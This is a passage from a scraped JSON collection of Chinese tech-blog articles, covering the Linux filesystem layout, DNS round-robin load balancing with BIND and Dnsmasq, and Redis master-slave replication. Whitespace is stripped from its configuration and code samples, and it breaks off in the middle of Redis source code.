的系统可能还有一些我们上面没有提到的目录。例如，在屏幕截图中，有一个/snap目录。这是因为这张截图是在Ubuntu系统上截取的。Ubuntu最近将snap包作为一种分发软件的方式。/snap目录包含所有文件和从snaps安装的软件。更深入的研究这里仅仅谈了根目录，但是许多子目录都指向它们自己的一组文件和子目录。图2给出了基本文件系统的总体概念（图片是在PaulGardner的CCBY-SA许可下提供的），Wikipedia对每个目录的用途进行了总结。图2：标准Unix文件系统要自行探索文件系统，请使用cd命令：cd将带你到你所选择的目录（cd代表更改目录）。如果你不知道你在哪儿，pwd会告诉你，你到底在哪里，（pwd代表打印工作目录），同时cd命令在没有任何选项或者参数的时候，将会直接带你到你自己的主目录，这是一个安全舒适的地方。最后，cd..将会带你到上一层目录，会使你更加接近根目录，如果你在/usr/share/wallpapers目录，然后你执行cd..命令，你将会跳转到/usr/share目录要查看目录里有什么内容，使用ls或这简单的使用l列出你所在目录的内容。当然，你总是可以使用tree来获得目录中内容的概述。在/usr/share上试试——里面有很多有趣的东西。总结尽管Linux发行版之间存在细微差别，但它们的文件系统的布局非常相似。你可以这么说：一旦你了解一个，你就会都了解了。了解文件系统的最好方法就是探索它。因此，伴随tree，ls和cd进入未知的领域吧。你不会只是因为查看文件系统就破坏了文件系统，因此请从一个目录移动到另一个目录并进行浏览。很快你就会发现Linux文件系统及其布局的确很有意义，并且你会直观地知道在哪里可以找到应用程序，文档和其他资源。通过Linux基金会和edX免费的“Linux入门”课程了解更多有关Linux的信息。1赞2收藏评论", "url_object_id": "b712fbfeffbfaff779433029fcdbb8d8"},{"title": "在 Linux 上用 DNS 实现简单的负载均衡", "url": "http://blog.jobbole.com/114157/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,6,/,2,5, ,·", "content": "原文出处：CarlaShroder译文出处：Linux中国/qhwdwDNS轮询将多个服务器映射到同一个主机名，并没有为这里展示的魔法做更多的工作。如果你的后端服务器是由多台服务器构成的，比如集群化或者镜像的Web或者文件服务器，通过负载均衡器提供了单一的入口点。业务繁忙的大型电商在高端负载均衡器上花费了大量的资金，用它来执行各种各样的任务：代理、缓存、状况检查、SSL处理、可配置的优先级、流量整形等很多任务。但是你并不需要做那么多工作的负载均衡器。你需要的是一个跨服务器分发负载的简单方法，它能够提供故障切换，并且不太在意它是否高效和完美。DNS轮询和使用轮询的子域委派是实现这个目标的两种简单方法。DNS轮询是将多台服务器映射到同一个主机名上，当用户访问foo.example.com时多台服务器都可用于处理它们的请求，使用的就是这种方式。当你有多个子域或者你的服务器在地理上比较分散时，使用轮询的子域委派就比较有用。你有一个主域名服务器，而子域有它们自己的域名服务器。你的主域名服务器将所有的到子域的请求指向到它们自己的域名服务器上。这将提升响应时间，因为DNS协议会自动查找最快的链路。DNS轮询轮询和旅鸫鸟robins没有任何关系，据我相熟的图书管理员说，它最初是一个法语短语，rubanrond、或者roundribbon。很久以前，法国政府官员以不分级的圆形、波浪线、或者直线形状来在请愿书上签字，以盖住原来的发起人。DNS轮询也是不分级的，简单配置一个服务器列表，然后将请求转到每个服务器上。它并不做真正的负载均衡，因为它根本就不测量负载，也没有状况检查，因此如果一个服务器宕机，请求仍然会发送到那个宕机的服务器上。它的优点就是简单。如果你有一个小的文件或者Web服务器集群，想通过一个简单的方法在它们之间分散负载，那么DNS轮询很适合你。你所做的全部配置就是创建多条A或者AAAA记录，映射多台服务器到单个的主机名。这个BIND示例同时使用了IPv4和IPv6私有地址类：fileserv.example.com.INA172.16.10.10fileserv.example.com.INA172.16.10.11fileserv.example.com.INA172.16.10.12fileserv.example.com.INAAAAfd02:faea:f561:8fa0:1::10fileserv.example.com.INAAAAfd02:faea:f561:8fa0:1::11fileserv.example.com.INAAAAfd02:faea:f561:8fa0:1::1212345678fileserv.example.com.INA172.16.10.10fileserv.example.com.INA172.16.10.11fileserv.example.com.INA172.16.10.12fileserv.example.com.INAAAAfd02:faea:f561:8fa0:1::10fileserv.example.com.INAAAAfd02:faea:f561:8fa0:1::11fileserv.example.com.INAAAAfd02:faea:f561:8fa0:1::12Dnsmasq在/etc/hosts文件中保存A和AAAA记录：172.16.1.10fileservfileserv.example.com172.16.1.11fileservfileserv.example.com172.16.1.12fileservfileserv.example.comfd02:faea:f561:8fa0:1::10fileservfileserv.example.comfd02:faea:f561:8fa0:1::11fileservfileserv.example.comfd02:faea:f561:8fa0:1::12fileservfileserv.example.com1234567172.16.1.10fileservfileserv.example.com172.16.1.11fileservfileserv.example.com172.16.1.12fileservfileserv.example.comfd02:faea:f561:8fa0:1::10fileservfileserv.example.comfd02:faea:f561:8fa0:1::11fileservfileserv.example.comfd02:faea:f561:8fa0:1::12fileservfileserv.example.com请注意这些示例都是很简化的，解析完全合格域名有多种方法，因此，关于如何配置DNS请自行学习。使用dig命令去检查你的配置能否按预期工作。将ns.example.com替换为你的域名服务器：$dig@ns.example.comfileservAfileservAAA12$dig@ns.example.comfileservAfileservAAA它将同时显示出IPv4和IPv6的轮询记录。子域委派和轮询子域委派结合轮询要做的配置会更多，但是这样有一些好处。当你有多个子域或者地理位置比较分散的服务器时，就应该去使用它。它的响应时间更快，并且宕机的服务器不会去响应，因此客户端不会因为等待回复而被挂住。一个短的TTL，比如60秒，就能帮你做到。这种方法需要多台域名服务器。在最简化的场景中，你需要一台主域名服务器和两个子域，每个子域都有它们自己的域名服务器。在子域服务器上配置你的轮询记录，然后在你的主域名服务器上配置委派。在主域名服务器上的BIND中，你至少需要两个额外的配置，一个区声明以及在区数据文件中的A/AAAA记录。主域名服务器中的委派应该像如下的内容：ns1.sub.example.com.INA172.16.1.20ns1.sub.example.com.INAAAAfd02:faea:f561:8fa0:1::20ns2.sub.example.com.INA172.16.1.21ns2.sub.example.com.INAAAfd02:faea:f561:8fa0:1::21sub.example.com.INNSns1.sub.example.com.sub.example.com.INNSns2.sub.example.com.12345678ns1.sub.example.com.INA172.16.1.20ns1.sub.example.com.INAAAAfd02:faea:f561:8fa0:1::20ns2.sub.example.com.INA172.16.1.21ns2.sub.example.com.INAAAfd02:faea:f561:8fa0:1::21sub.example.com.INNSns1.sub.example.com.sub.example.com.INNSns2.sub.example.com.接下来的每台子域服务器上有它们自己的区文件。在这里它的关键点是每个服务器去返回它自己的IP地址。在named.conf中的区声明，所有的服务上都是一样的：zone\"sub.example.com\"{typemaster;file\"db.sub.example.com\";};12345zone\"sub.example.com\"{typemaster;file\"db.sub.example.com\";};然后数据文件也是相同的，除了那个A/AAAA记录使用的是各个服务器自己的IP地址。SOA记录都指向到主域名服务器：;firstsubdomainnameserver$ORIGINsub.example.com.$TTL60sub.example.comINSOAns1.example.com.admin.example.com.(2018123456;serial3H;refresh15;retry3600000;expire)sub.example.com.INNSns1.sub.example.com.sub.example.com.INA172.16.1.20ns1.sub.example.com.INAAAAfd02:faea:f561:8fa0:1::20;secondsubdomainnameserver$ORIGINsub.example.com.$TTL60sub.example.comINSOAns1.example.com.admin.example.com.(2018234567;serial3H;refresh15;retry3600000;expire)sub.example.com.INNSns1.sub.example.com.sub.example.com.INA172.16.1.21ns2.sub.example.com.INAAAAfd02:faea:f561:8fa0:1::21123456789101112131415161718192021222324252627;firstsubdomainnameserver$ORIGINsub.example.com.$TTL60sub.example.comINSOAns1.example.com.admin.example.com.(2018123456;serial3H;refresh15;retry3600000;expire)sub.example.com.INNSns1.sub.example.com.sub.example.com.INA172.16.1.20ns1.sub.example.com.INAAAAfd02:faea:f561:8fa0:1::20;secondsubdomainnameserver$ORIGINsub.example.com.$TTL60sub.example.comINSOAns1.example.com.admin.example.com.(2018234567;serial3H;refresh15;retry3600000;expire)sub.example.com.INNSns1.sub.example.com.sub.example.com.INA172.16.1.21ns2.sub.example.com.INAAAAfd02:faea:f561:8fa0:1::21接下来生成子域服务器上的轮询记录，方法和前面一样。现在你已经有了多个域名服务器来处理到你的子域的请求。再说一次，BIND是很复杂的，做同一件事情它有多种方法，因此，给你留的家庭作业是找出适合你使用的最佳配置方法。在Dnsmasq中做子域委派很容易。在你的主域名服务器上的dnsmasq.conf文件中添加如下的行，去指向到子域的域名服务器：server=/sub.example.com/172.16.1.20server=/sub.example.com/172.16.1.21server=/sub.example.com/fd02:faea:f561:8fa0:1::20server=/sub.example.com/fd02:faea:f561:8fa0:1::2112345server=/sub.example.com/172.16.1.20server=/sub.example.com/172.16.1.21server=/sub.example.com/fd02:faea:f561:8fa0:1::20server=/sub.example.com/fd02:faea:f561:8fa0:1::21然后在子域的域名服务器上的/etc/hosts中配置轮询。获取配置方法的详细内容和帮助，请参考这些资源：DnsmasqDNSandBIND,5thEdition通过来自Linux基金会和edX的免费课程“Linux入门”学习更多Linux的知识。1赞1收藏评论", "url_object_id": "1d572c5a3d4363cbf04c9d85ab99bc4e"},{"title": "深入学习 Redis（3）：主从复制", "url": "http://blog.jobbole.com/114194/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "praise_nums": 1, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,7,/,0,5, ,·", "content": "原文出处：编程迷思前言在前面的两篇文章中，分别介绍了Redis的内存模型和Redis的持久化。在Redis的持久化中曾提到，Redis高可用的方案包括持久化、主从复制（及读写分离）、哨兵和集群。其中持久化侧重解决的是Redis数据的单机备份问题（从内存到硬盘的备份）；而主从复制则侧重解决数据的多机热备。此外，主从复制还可以实现负载均衡和故障恢复。这篇文章中，将详细介绍Redis主从复制的方方面面，包括：如何使用主从复制、主从复制的原理（重点是全量复制和部分复制、以及心跳机制）、实际应用中需要注意的问题（如数据不一致问题、复制超时问题、复制缓冲区溢出问题）、主从复制相关的配置（重点是repl-timeout、client-output-buffer-limitslave）等。一、主从复制概述主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。主从复制的作用主从复制的作用主要包括：数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。高可用基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。二、如何使用主从复制为了更直观的理解主从复制，在介绍其内部原理之前，先说明我们需要如何操作才能开启主从复制。1.建立复制需要注意，主从复制的开启，完全是在从节点发起的；不需要我们在主节点做任何事情。从节点开启主从复制，有3种方式：（1）配置文件在从服务器的配置文件中加入：slaveof&lt;masterip&gt;&lt;masterport&gt;（2）启动命令redis-server启动命令后加入–slaveof&lt;masterip&gt;&lt;masterport&gt;（3）客户端命令Redis服务器启动后，直接通过客户端执行命令：slaveof&lt;masterip&gt;&lt;masterport&gt;，则该Redis实例成为从节点。上述3种方式是等效的，下面以客户端命令的方式为例，看一下当执行了slaveof后，Redis主节点和从节点的变化。2.实例准备工作：启动两个节点方便起见，实验所使用的主从节点是在一台机器上的不同Redis实例，其中主节点监听6379端口，从节点监听6380端口；从节点监听的端口号可以在配置文件中修改：启动后可以看到：两个Redis节点启动后（分别称为6379节点和6380节点），默认都是主节点。建立复制此时在6380节点执行slaveof命令，使之变为从节点：观察效果下面验证一下，在主从复制建立后，主节点的数据会复制到从节点中。（1）首先在从节点查询一个不存在的key：（2）然后在主节点中增加这个key：（3）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：（4）然后在主节点删除这个key：（5）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：3.断开复制通过slaveof&lt;masterip&gt;&lt;masterport&gt;命令建立主从复制关系以后，可以通过slaveofnoone断开。需要注意的是，从节点断开复制后，不会删除已有的数据，只是不再接受主节点新的数据变化。从节点执行slaveofnoone后，打印日志如下所示；可以看出断开复制后，从节点又变回为主节点。主节点打印日志如下：三、主从复制的实现原理上面一节中，介绍了如何操作可以建立主从关系；本小节将介绍主从复制的实现原理。主从复制过程大体可以分为3个阶段：连接建立阶段（即准备阶段）、数据同步阶段、命令传播阶段；下面分别进行介绍。1.连接建立阶段该阶段的主要作用是在主从节点之间建立连接，为数据同步做好准备。步骤1：保存主节点信息从节点服务器内部维护了两个字段，即masterhost和masterport字段，用于存储主节点的ip和port信息。需要注意的是，slaveof是异步命令，从节点完成主节点ip和port的保存后，向发送slaveof命令的客户端直接返回OK，实际的复制操作在这之后才开始进行。这个过程中，可以看到从节点打印日志如下：步骤2：建立socket连接从节点每秒1次调用复制定时函数replicationCron()，如果发现了有主节点可以连接，便会根据主节点的ip和port，创建socket连接。如果连接成功，则：从节点：为该socket建立一个专门处理复制工作的文件事件处理器，负责后续的复制工作，如接收RDB文件、接收命令传播等。主节点：接收到从节点的socket连接后（即accept之后），为该socket创建相应的客户端状态，并将从节点看做是连接到主节点的一个客户端，后面的步骤会以从节点向主节点发送命令请求的形式来进行。这个过程中，从节点打印日志如下：步骤3：发送ping命令从节点成为主节点的客户端之后，发送ping命令进行首次请求，目的是：检查socket连接是否可用，以及主节点当前是否能够处理请求。从节点发送ping命令后，可能出现3种情况：（1）返回pong：说明socket连接正常，且主节点当前可以处理请求，复制过程继续。（2）超时：一定时间后从节点仍未收到主节点的回复，说明socket连接不可用，则从节点断开socket连接，并重连。（3）返回pong以外的结果：如果主节点返回其他结果，如正在处理超时运行的脚本，说明主节点当前无法处理命令，则从节点断开socket连接，并重连。在主节点返回pong情况下，从节点打印日志如下：步骤4：身份验证如果从节点中设置了masterauth选项，则从节点需要向主节点进行身份验证；没有设置该选项，则不需要验证。从节点进行身份验证是通过向主节点发送auth命令进行的，auth命令的参数即为配置文件中的masterauth的值。如果主节点设置密码的状态，与从节点masterauth的状态一致（一致是指都存在，且密码相同，或者都不存在），则身份验证通过，复制过程继续；如果不一致，则从节点断开socket连接，并重连。步骤5：发送从节点端口信息身份验证之后，从节点会向主节点发送其监听的端口号（前述例子中为6380），主节点将该信息保存到该从节点对应的客户端的slave_listening_port字段中；该端口信息除了在主节点中执行infoReplication时显示以外，没有其他作用。2.数据同步阶段主从节点之间的连接建立以后，便可以开始进行数据同步，该阶段可以理解为从节点数据的初始化。具体执行的方式是：从节点向主节点发送psync命令（Redis2.8以前是sync命令），开始同步。数据同步阶段是主从复制最核心的阶段，根据主从节点当前状态的不同，可以分为全量复制和部分复制，下面会有一章专门讲解这两种复制方式以及psync命令的执行过程，这里不再详述。需要注意的是，在数据同步阶段之前，从节点是主节点的客户端，主节点不是从节点的客户端；而到了这一阶段及以后，主从节点互为客户端。原因在于：在此之前，主节点只需要响应从节点的请求即可，不需要主动发请求，而在数据同步阶段和后面的命令传播阶段，主节点需要主动向从节点发送请求（如推送缓冲区中的写命令），才能完成复制。3.命令传播阶段数据同步阶段完成后，主从节点进入命令传播阶段；在这个阶段主节点将自己执行的写命令发送给从节点，从节点接收命令并执行，从而保证主从节点数据的一致性。在命令传播阶段，除了发送写命令，主从节点还维持着心跳机制：PING和REPLCONFACK。由于心跳机制的原理涉及部分复制，因此将在介绍了部分复制的相关内容后单独介绍该心跳机制。延迟与不一致需要注意的是，命令传播是异步的过程，即主节点发送写命令后并不会等待从节点的回复；因此实际上主从节点之间很难保持实时的一致性，延迟在所难免。数据不一致的程度，与主从节点之间的网络状况、主节点写命令的执行频率、以及主节点中的repl-disable-tcp-nodelay配置等有关。repl-disable-tcp-nodelayno：该配置作用于命令传播阶段，控制主节点是否禁止与从节点的TCP_NODELAY；默认no，即不禁止TCP_NODELAY。当设置为yes时，TCP会对包进行合并从而减少带宽，但是发送的频率会降低，从节点数据延迟增加，一致性变差；具体发送频率与Linux内核的配置有关，默认配置为40ms。当设置为no时，TCP会立马将主节点的数据发送给从节点，带宽增加但延迟变小。一般来说，只有当应用对Redis数据不一致的容忍度较高，且主从节点之间网络状况不好时，才会设置为yes；多数情况使用默认值no。四、【数据同步阶段】全量复制和部分复制在Redis2.8以前，从节点向主节点发送sync命令请求同步数据，此时的同步方式是全量复制；在Redis2.8及以后，从节点可以发送psync命令请求同步数据，此时根据主从节点当前状态的不同，同步方式可能是全量复制或部分复制。后文介绍以Redis2.8及以后版本为例。全量复制：用于初次复制或其他无法进行部分复制的情况，将主节点中的所有数据都发送给从节点，是一个非常重型的操作。部分复制：用于网络中断等情况后的复制，只将中断期间主节点执行的写命令发送给从节点，与全量复制相比更加高效。需要注意的是，如果网络中断时间过长，导致主节点没有能够完整地保存中断期间执行的写命令，则无法进行部分复制，仍使用全量复制。1.全量复制Redis通过psync命令进行全量复制的过程如下：（1）从节点判断无法进行部分复制，向主节点发送全量复制的请求；或从节点发送部分复制的请求，但主节点判断无法进行全量复制；具体判断过程需要在讲述了部分复制原理后再介绍。（2）主节点收到全量复制的命令后，执行bgsave，在后台生成RDB文件，并使用一个缓冲区（称为复制缓冲区）记录从现在开始执行的所有写命令（3）主节点的bgsave执行完成后，将RDB文件发送给从节点；从节点首先清除自己的旧数据，然后载入接收的RDB文件，将数据库状态更新至主节点执行bgsave时的数据库状态（4）主节点将前述复制缓冲区中的所有写命令发送给从节点，从节点执行这些写命令，将数据库状态更新至主节点的最新状态（5）如果从节点开启了AOF，则会触发bgrewriteaof的执行，从而保证AOF文件更新至主节点的最新状态下面是执行全量复制时，主从节点打印的日志；可以看出日志内容与上述步骤是完全对应的。主节点的打印日志如下：从节点打印日志如下图所示：其中，有几点需要注意：从节点接收了来自主节点的89260个字节的数据；从节点在载入主节点的数据之前要先将老数据清除；从节点在同步完数据后，调用了bgrewriteaof。通过全量复制的过程可以看出，全量复制是非常重型的操作：（1）主节点通过bgsave命令fork子进程进行RDB持久化，该过程是非常消耗CPU、内存(页表复制)、硬盘IO的；关于bgsave的性能问题，可以参考深入学习Redis（2）：持久化（2）主节点通过网络将RDB文件发送给从节点，对主从节点的带宽都会带来很大的消耗（3）从节点清空老数据、载入新RDB文件的过程是阻塞的，无法响应客户端的命令；如果从节点执行bgrewriteaof，也会带来额外的消耗2.部分复制由于全量复制在主节点数据量较大时效率太低，因此Redis2.8开始提供部分复制，用于处理网络中断时的数据同步。部分复制的实现，依赖于三个重要的概念：（1）复制偏移量主节点和从节点分别维护一个复制偏移量（offset），代表的是主节点向从节点传递的字节数；主节点每次向从节点传播N个字节数据时，主节点的offset增加N；从节点每次收到主节点传来的N个字节数据时，从节点的offset增加N。offset用于判断主从节点的数据库状态是否一致：如果二者offset相同，则一致；如果offset不同，则不一致，此时可以根据两个offset找出从节点缺少的那部分数据。例如，如果主节点的offset是1000，而从节点的offset是500，那么部分复制就需要将offset为501-1000的数据传递给从节点。而offset为501-1000的数据存储的位置，就是下面要介绍的复制积压缓冲区。（2）复制积压缓冲区复制积压缓冲区是由主节点维护的、固定长度的、先进先出(FIFO)队列，默认大小1MB；当主节点开始有从节点时创建，其作用是备份主节点最近发送给从节点的数据。注意，无论主节点有一个还是多个从节点，都只需要一个复制积压缓冲区。在命令传播阶段，主节点除了将写命令发送给从节点，还会发送一份给复制积压缓冲区，作为写命令的备份；除了存储写命令，复制积压缓冲区中还存储了其中的每个字节对应的复制偏移量（offset）。由于复制积压缓冲区定长且是先进先出，所以它保存的是主节点最近执行的写命令；时间较早的写命令会被挤出缓冲区。由于该缓冲区长度固定且有限，因此可以备份的写命令也有限，当主从节点offset的差距过大超过缓冲区长度时，将无法执行部分复制，只能执行全量复制。反过来说，为了提高网络中断时部分复制执行的概率，可以根据需要增大复制积压缓冲区的大小(通过配置repl-backlog-size)；例如如果网络中断的平均时间是60s，而主节点平均每秒产生的写命令(特定协议格式)所占的字节数为100KB，则复制积压缓冲区的平均需求为6MB，保险起见，可以设置为12MB，来保证绝大多数断线情况都可以使用部分复制。从节点将offset发送给主节点后，主节点根据offset和缓冲区大小决定能否执行部分复制：如果offset偏移量之后的数据，仍然都在复制积压缓冲区里，则执行部分复制；如果offset偏移量之后的数据已不在复制积压缓冲区中（数据已被挤出），则执行全量复制。（3）服务器运行ID(runid)每个Redis节点(无论主从)，在启动时都会自动生成一个随机ID(每次启动都不一样)，由40个随机的十六进制字符组成；runid用来唯一识别一个Redis节点。通过infoServer命令，可以查看节点的runid：主从节点初次复制时，主节点将自己的runid发送给从节点，从节点将这个runid保存起来；当断线重连时，从节点会将这个runid发送给主节点；主节点根据runid判断能否进行部分复制：如果从节点保存的runid与主节点现在的runid相同，说明主从节点之前同步过，主节点会继续尝试使用部分复制(到底能不能部分复制还要看offset和复制积压缓冲区的情况)；如果从节点保存的runid与主节点现在的runid不同，说明从节点在断线前同步的Redis节点并不是当前的主节点，只能进行全量复制。3.psync命令的执行在了解了复制偏移量、复制积压缓冲区、节点运行id之后，本节将介绍psync命令的参数和返回值，从而说明psync命令执行过程中，主从节点是如何确定使用全量复制还是部分复制的。psync命令的执行过程可以参见下图（图片来源：《Redis设计与实现》）：（1）首先，从节点根据当前状态，决定如何调用psync命令：如果从节点之前未执行过slaveof或最近执行了slaveofnoone，则从节点发送命令为psync?-1，向主节点请求全量复制；如果从节点之前执行了slaveof，则发送命令为psync&lt;runid&gt;&lt;offset&gt;，其中runid为上次复制的主节点的runid，offset为上次复制截止时从节点保存的复制偏移量。（2）主节点根据收到的psync命令，及当前服务器状态，决定执行全量复制还是部分复制：如果主节点版本低于Redis2.8，则返回-ERR回复，此时从节点重新发送sync命令执行全量复制；如果主节点版本够新，且runid与从节点发送的runid相同，且从节点发送的offset之后的数据在复制积压缓冲区中都存在，则回复+CONTINUE，表示将进行部分复制，从节点等待主节点发送其缺少的数据即可；如果主节点版本够新，但是runid与从节点发送的runid不同，或从节点发送的offset之后的数据已不在复制积压缓冲区中(在队列中被挤出了)，则回复+FULLRESYNC&lt;runid&gt;&lt;offset&gt;，表示要进行全量复制，其中runid表示主节点当前的runid，offset表示主节点当前的offset，从节点保存这两个值，以备使用。4.部分复制演示在下面的演示中，网络中断几分钟后恢复，断开连接的主从节点进行了部分复制；为了便于模拟网络中断，本例中的主从节点在局域网中的两台机器上。网络中断网络中断一段时间后，主节点和从节点都会发现失去了与对方的连接（关于主从节点对超时的判断机制，后面会有说明）；此后，从节点便开始执行对主节点的重连，由于此时网络还没有恢复，重连失败，从节点会一直尝试重连。主节点日志如下：从节点日志如下：网络恢复网络恢复后，从节点连接主节点成功，并请求进行部分复制，主节点接收请求后，二者进行部分复制以同步数据。主节点日志如下：从节点日志如下：五、【命令传播阶段】心跳机制在命令传播阶段，除了发送写命令，主从节点还维持着心跳机制：PING和REPLCONFACK。心跳机制对于主从复制的超时判断、数据安全等有作用。1.主-&gt;从：PING每隔指定的时间，主节点会向从节点发送PING命令，这个PING命令的作用，主要是为了让从节点进行超时判断。PING发送的频率由repl-ping-slave-period参数控制，单位是秒，默认值是10s。关于该PING命令究竟是由主节点发给从节点，还是相反，有一些争议；因为在Redis的官方文档中，对该参数的注释中说明是从节点向主节点发送PING命令，如下图所示：但是根据该参数的名称(含有ping-slave)，以及代码实现，我认为该PING命令是主节点发给从节点的。相关代码如下：2.从-&gt;主：REPLCONFACK在命令传播阶段，从节点会向主节点发送REPLCONFACK命令，频率是每秒1次；命令格式为：REPLCONFACK{offset}，其中offset指从节点保存的复制偏移量。REPLCONFACK命令的作用包括：（1）实时监测主从节点网络状态：该命令会被主节点用于复制超时的判断。此外，在主节点中使用infoReplication，可以看到其从节点的状态中的lag值，代表的是主节点上次收到该REPLCONFACK命令的时间间隔，在正常情况下，该值应该是0或1，如下图所示：（2）检测命令丢失：从节点发送了自身的offset，主节点会与自己的offset对比，如果从节点数据缺失（如网络丢包），主节点会推送缺失的数据（这里也会利用复制积压缓冲区）。注意，offset和复制积压缓冲区，不仅可以用于部分复制，也可以用于处理命令丢失等情形；区别在于前者是在断线重连后进行的，而后者是在主从节点没有断线的情况下进行的。（3）辅助保证从节点的数量和延迟：Redis主节点中使用min-slaves-to-write和min-slaves-max-lag参数，来保证主节点在不安全的情况下不会执行写命令；所谓不安全，是指从节点数量太少，或延迟过高。例如min-slaves-to-write和min-slaves-max-lag分别是3和10，含义是如果从节点数量小于3个，或所有从节点的延迟值都大于10s，则主节点拒绝执行写命令。而这里从节点延迟值的获取，就是通过主节点接收到REPLCONFACK命令的时间来判断的，即前面所说的infoReplication中的lag值。六、应用中的问题1.读写分离及其中的问题在主从复制基础上实现的读写分离，可以实现Redis的读负载均衡：由主节点提供写服务，由一个或多个从节点提供读服务（多个从节点既可以提高数据冗余程度，也可以最大化读负载能力）；在读负载较大的应用场景下，可以大大提高Redis服务器的并发量。下面介绍在使用Redis读写分离时，需要注意的问题。（1）延迟与不一致问题前面已经讲到，由于主从复制的命令传播是异步的，延迟与数据的不一致不可避免。如果应用对数据不一致的接受程度程度较低，可能的优化措施包括：优化主从节点之间的网络环境（如在同机房部署）；监控主从节点延迟（通过offset）判断，如果从节点延迟过大，通知应用不再通过该从节点读取数据；使用集群同时扩展写负载和读负载等。在命令传播阶段以外的其他情况下，从节点的数据不一致可能更加严重，例如连接在数据同步阶段，或从节点失去与主节点的连接时等。从节点的slave-serve-stale-data参数便与此有关：它控制这种情况下从节点的表现；如果为yes（默认值），则从节点仍能够响应客户端的命令，如果为no，则从节点只能响应info、slaveof等少数命令。该参数的设置与应用对数据一致性的要求有关；如果对数据一致性要求很高，则应设置为no。（2）数据过期问题在单机版Redis中，存在两种删除策略：惰性删除：服务器不会主动删除数据，只有当客户端查询某个数据时，服务器判断该数据是否过期，如果过期则删除。定期删除：服务器执行定时任务删除过期数据，但是考虑到内存和CPU的折中（删除会释放内存，但是频繁的删除操作对CPU不友好），该删除的频率和执行时间都受到了限制。在主从复制场景下，为了主从节点的数据一致性，从节点不会主动删除数据，而是由主节点控制从节点中过期数据的删除。由于主节点的惰性删除和定期删除策略，都不能保证主节点及时对过期数据执行删除操作，因此，当客户端通过Redis从节点读取数据时，很容易读取到已经过期的数据。Redis3.2中，从节点在读取数据时，增加了对数据是否过期的判断：如果该数据已过期，则不返回给客户端；将Redis升级到3.2可以解决数据过期问题。（3）故障切换问题在没有使用哨兵的读写分离场景下，应用针对读和写分别连接不同的Redis节点；当主节点或从节点出现问题而发生更改时，需要及时修改应用程序读写Redis数据的连接；连接的切换可以手动进行，或者自己写监控程序进行切换，但前者响应慢、容易出错，后者实现复杂，成本都不算低。（4）总结在使用读写分离之前，可以考虑其他方法增加Redis的读负载能力：如尽量优化主节点（减少慢查询、减少持久化等其他情况带来的阻塞等）提高负载能力；使用Redis集群同时提高读负载能力和写负载能力等。如果使用读写分离，可以使用哨兵，使主从节点的故障切换尽可能自动化，并减少对应用程序的侵入。2.复制超时问题主从节点复制超时是导致复制中断的最重要的原因之一，本小节单独说明超时问题，下一小节说明其他会导致复制中断的问题。超时判断意义在复制连接建立过程中及之后，主从节点都有机制判断连接是否超时，其意义在于：（1）如果主节点判断连接超时，其会释放相应从节点的连接，从而释放各种资源，否则无效的从节点仍会占用主节点的各种资源（输出缓冲区、带宽、连接等）；此外连接超时的判断可以让主节点更准确的知道当前有效从节点的个数，有助于保证数据安全（配合前面讲到的min-slaves-to-write等参数）。（2）如果从节点判断连接超时，则可以及时重新建立连接，避免与主节点数据长期的不一致。判断机制主从复制超时判断的核心，在于repl-timeout参数，该参数规定了超时时间的阈值（默认60s），对于主节点和从节点同时有效；主从节点触发超时的条件分别如下：（1）主节点：每秒1次调用复制定时函数replicationCron()，在其中判断当前时间距离上次收到各个从节点REPLCONFACK的时间，是否超过了repl-timeout值，如果超过了则释放相应从节点的连接。（2）从节点：从节点对超时的判断同样是在复制定时函数中判断，基本逻辑是：如果当前处于连接建立阶段，且距离上次收到主节点的信息的时间已超过repl-timeout，则释放与主节点的连接；如果当前处于数据同步阶段，且收到主节点的RDB文件的时间超时，则停止数据同步，释放连接；如果当前处于命令传播阶段，且距离上次收到主节点的PING命令或数据的时间已超过repl-timeout值，则释放与主节点的连接。主从节点判断连接超时的相关源代码如下：/*Replicationcronfunction,called1timepersecond.*/voidreplicationCron(void){staticlonglongreplication_cron_loops=0;/*Nonblockingconnectiontimeout?*/if(server.masterhost&amp;&amp;(server.repl_state==REDIS_REPL_CONNECTING||slaveIsInHandshakeState())&amp;&amp;(time(NULL)-server.repl_transfer_lastio)&gt;server.repl_timeout){redisLog(REDIS_WARNING,\"TimeoutconnectingtotheMASTER...\");undoConnectWithMaster();}/*BulktransferI/Otimeout?*/if(server.masterhost&amp;&amp;server.repl_state==REDIS_REPL_TRANSFER&amp;&amp;(time(NULL)-server.repl_transfer_lastio)&gt;server.repl_timeout){redisLog(REDIS_WARNING,\"TimeoutreceivingbulkdatafromMASTER...Iftheproblempersiststrytosetthe'repl-timeout'parameterinredis.conftoalargervalue.\");replicationAbortSyncTransfer();}/*Timedoutmasterwhenweareanalreadyconnectedslave?*/if(server.masterhost&amp;&amp;server.repl_state==REDIS_REPL_CONNECTED&amp;&amp;(time(NULL)-server.master-&gt;lastinteraction)&gt;server.repl_timeout){redisLog(REDIS_WARNING,\"MASTERtimeout:nodatanorPINGreceived...\");freeClient(server.master);}//此处省略无关代码……/*Disconnecttimedoutslaves.*/if(listLength(server.slaves)){listIterli;listNode*ln;listRewind(server.slaves,&amp;li);while((ln=listNext(&amp;li))){redisClient*slave=ln-&gt;value;if(slave-&gt;replstate!=REDIS_REPL_ONLINE)continue;if(slave-&gt;flags&amp;REDIS_PRE_P